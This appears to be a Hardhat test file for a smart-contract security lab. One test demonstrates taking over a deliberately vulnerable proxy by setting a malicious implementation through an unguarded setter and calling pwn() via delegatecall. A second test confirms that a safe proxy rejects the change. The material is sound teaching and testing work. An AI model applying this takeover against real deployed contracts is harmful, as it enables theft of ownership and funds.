const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Delegatecall Lab", function () {
  it("VulnerableProxy can be taken over via delegatecall", async () => {
    const [deployer, attacker] = await ethers.getSigners();

    const VulnerableProxy = await ethers.getContractFactory("VulnerableProxy", deployer);
    const proxy = await VulnerableProxy.deploy();
    await proxy.waitForDeployment();

    expect(await proxy.owner()).to.equal(deployer.address);

    const ProxyAttacker = await ethers.getContractFactory("ProxyAttacker", attacker);
    const evilImpl = await ProxyAttacker.deploy();
    await evilImpl.waitForDeployment();

    // Attacker sets implementation (no access control)
    await proxy.connect(attacker).setImplementation(await evilImpl.getAddress());

    // Attacker calls pwn() THROUGH proxy -> delegatecall executes in proxy context
    await attacker.sendTransaction({
      to: await proxy.getAddress(),
      data: evilImpl.interface.encodeFunctionData("pwn", []),
    });

    expect(await proxy.owner()).to.equal(attacker.address);
  });

  it("SafeProxy prevents unauthorized implementation changes", async () => {
    const [deployer, attacker] = await ethers.getSigners();

    const SafeProxy = await ethers.getContractFactory("SafeProxy", deployer);
    const proxy = await SafeProxy.deploy();
    await proxy.waitForDeployment();

    const ProxyAttacker = await ethers.getContractFactory("ProxyAttacker", attacker);
    const evilImpl = await ProxyAttacker.deploy();
    await evilImpl.waitForDeployment();

    await expect(
      proxy.connect(attacker).setImplementation(await evilImpl.getAddress())
    ).to.be.revertedWith("not owner");
  });
});
